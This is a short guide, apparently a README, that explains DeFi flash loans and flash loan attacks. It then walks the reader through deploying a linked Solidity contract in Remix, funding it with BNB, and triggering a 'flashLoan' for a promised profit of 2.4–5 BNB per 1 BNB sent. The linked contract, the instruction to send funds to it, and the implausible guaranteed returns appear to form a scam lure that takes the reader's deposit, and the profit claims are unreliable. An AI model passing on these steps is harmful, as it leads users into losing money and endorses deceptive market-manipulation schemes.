**FOR EDUCATION PURPOSE. This worked for me. TRY IT AT YOUR OWN RISK.**

**What is a Flash Loan?**
Flash Loans are a new uncollateralised loan product in DeFi.Flash Loans empower
traders and DeFi users by enabling instant borrowing with no collateral required
provided that the liquidity is returned to the pool within one transaction block.

**How Flash Loan Attacks Work?**
Flash loans allow a user to borrow as much as they want with zero capital. For
instance, if you’d like to borrow $70,000 worth of ETH, a lending protocol instantly
gives it to you, but that doesn’t mean it’s yours. You need to do something with the
borrowed funds in order to pay back the loan and perhaps pocket the excess amount.

For this to work, the process needs to happen fast and the debt must be repaid to
the protocol in time, otherwise the transaction will reverse. A decentralized lender
doesn’t require collateral from you since the agreement to pay your debt is enforced
by a blockchain. Flash loan attackers thrive on finding ways to manipulate the market
while still abiding by a blockchain’s rules.

**INSTRUCTION:**

1. Open Remix.
    link: https://remix.ethereum.org/
    
2. Open the link and copy the Smart Contract Code
    link: https://github.com/CPPHSmartContract/FlashLoan-Smart-Contract/blob/d87902e15f8f565c374a7246d4dd0364e58d6698/FlashLoan.sol
    
3. Create New File. > _FlashLoan.sol_ -- in remix and paste the Smart Contract Code and
   wait everything to load.
   
4. [nextTAB@-Remix] "Compiler Tab"; Choose Compiler version to **0.5.0**

5. Click **"Compile FlashLoan.sol"** , wait everything to load.

6. [nextTAB@-Remix] "Deploy & Run Transaction";
        **[Environment]** set to > **"Injected Web3"** to connect your Metamask to _remix.etherium.org_
        
        **[Contract]** choose "InitiateFlashLoan - FlashLoan.sol"
        
        **[Deploy]** click the ˅ arrow down besides of Deploy
            TOKENNAME:     _put any token name here, in this part we will make new token name. So PancakeSwap will think you are new developer of token_
            TOKENSYMBOL:   _put Token Symbol here. ex. ETH, SLP, SKILL, BTCB or anything you like that will fit on your Token Name_
            LOANAMOUNT:    **3137**
            
7. Click **"Transact"**, Pay the Gas fee to publish your own Smart Contract. ~0.015BNB only.

8. Wait for your Smart Contract at the Deployed area below.

9. **Verify** your Smart Contract Address; Click the ˅ button at your deployed Smart Contract.
            click > [checkOwnerAddress] -- **Make it sure it will show your public address. If not, repeat the process**
            click > [contractAddress]   -- **This will be your contract address**
            click > [loanBalance]       -- **It will show here your loan Balance**
            click > [tokenName]         -- **It will show here your own Token name**
            click > [tokenSymbol]       -- **It will show here your own Token Symbol**

9. Send Loan amount to your **own** Smart Contract Address.
    **Make it sure your are sending to your OWN Smart Contract Address** you can also click the "Copy value to clipboard" to prevent mistyped.
    
    _my loan:
    sent loan = 1BNB I got a profit of 2.4BNB - 5BNB_
    
10. Click **[flashLoan]** and pay the gas fee. Wait for you smart contract to process your Loan, paid it, and **take profit** in just ONE block.




